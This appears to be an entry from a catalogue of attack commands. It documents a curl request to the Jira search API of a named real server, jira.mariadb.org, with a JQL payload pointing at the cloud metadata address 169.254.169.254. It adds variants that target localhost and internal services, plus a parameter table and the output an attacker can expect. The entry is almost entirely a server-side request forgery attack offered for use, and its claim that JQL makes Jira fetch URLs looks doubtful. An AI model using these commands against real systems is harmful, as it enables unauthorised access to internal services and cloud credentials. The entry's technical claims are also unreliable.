---
id: c2b3c4d5-e6f7-8901-bcde-f2345678902
data: >-
  curl -X POST 'https://jira.mariadb.org/rest/api/2/search' -H 'Content-Type:
  application/json' -d '{"jql":"url=http://169.254.169.254/latest/meta-data/"}'
tags:
  - ssrf
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:08:55.433Z'
verified: false
validated: true
submitted: true
---
# curl-internal-probe

## Command

```bash
curl -X POST 'https://jira.mariadb.org/rest/api/2/search' -H 'Content-Type: application/json' -d '{"jql":"url=http://169.254.169.254/latest/meta-data/"}'
```

## Description

This command exploits SSRF by directing the Jira server to fetch an internal metadata endpoint, potentially leaking cloud instance details in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `'https://jira.mariadb.org/rest/api/2/search'` | Jira endpoint | Yes |
| `-H 'Content-Type: application/json'` | JSON content type | Yes |
| `-d '{...}'` | Payload with internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target-jira.com/rest/api/2/search' -H 'Content-Type: application/json' -d '{"jql":"url=http://localhost/admin"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target-jira.com/rest/api/2/search' -d '{"jql":"url=http://internal-service:8080/"}'
```

## Expected Output

Jira response (e.g., 200 OK) containing fragments of internal data or errors exposing resource info.

## Related

- [[Related Procedure: Exploit-SSRF-for-Internal-Access]]
